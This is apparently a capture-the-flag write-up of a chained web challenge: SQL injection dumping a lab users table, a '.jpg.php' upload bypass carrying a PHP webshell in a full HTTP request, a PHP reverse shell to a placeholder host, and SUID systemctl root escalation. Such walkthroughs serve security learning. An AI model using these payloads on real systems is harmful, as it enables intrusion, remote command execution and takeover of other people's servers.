### Chained Web Challenges (SQLi, RCE)

The Tenant and Management login pages were both vulnerable to SQL injection.

Using SQLMap, we could dump the users table in the database.

```
+-----+----------------+---------+------------+----------------+
| id  | name           | role    | password   | username       |
+-----+----------------+---------+------------+----------------+
| 100 | theadmin       | admin   | madeira101 | theadmin       |
| 200 | ahhong         | manager | manager101 | MANAGER        |
| 300 | HTX{Admin_101} | vendor  | vendor101  | HTX{Admin_101} |
+-----+----------------+---------+------------+----------------+
```

Taking a closer look at the users, we could see that each one has a different role. Logging in as different users allows us to perform various actions. As the vendor user, we have the ability to add to the food listing.

This allows us to upload an image, and the validation for this is flawed. It seemed to be checking for the existence of the `.jpg` extension, but using `.jpg.php` passes this check and allows us to upload a PHP webshell that we can access at `http://10.8.201.87/HTXIC/vendor/images/`.

```http
POST /HTXIC/vendor/doaddFoods.php HTTP/1.1
Host: 10.8.201.87
Content-Length: 504
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTeHcGQrvcC6GYyC2
Cookie: PHPSESSID=6co2q20vqh580a4uae4gpq3grl
Connection: close

------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="name"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="price"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="description"


------WebKitFormBoundaryTeHcGQrvcC6GYyC2
Content-Disposition: form-data; name="image"; filename="pwned.jpg.php"
Content-Type: image/jpeg

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryTeHcGQrvcC6GYyC2--
```

Using a PHP reverse shell payload, we were able to get a bash shell into the system.

```php
$sock=fsockopen("LHOST", LPORT);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

The `systemctl` binary had the SUID bit set, allowing us to escalate to root privileges by [creating a service](https://gtfobins.github.io/gtfobins/systemctl/).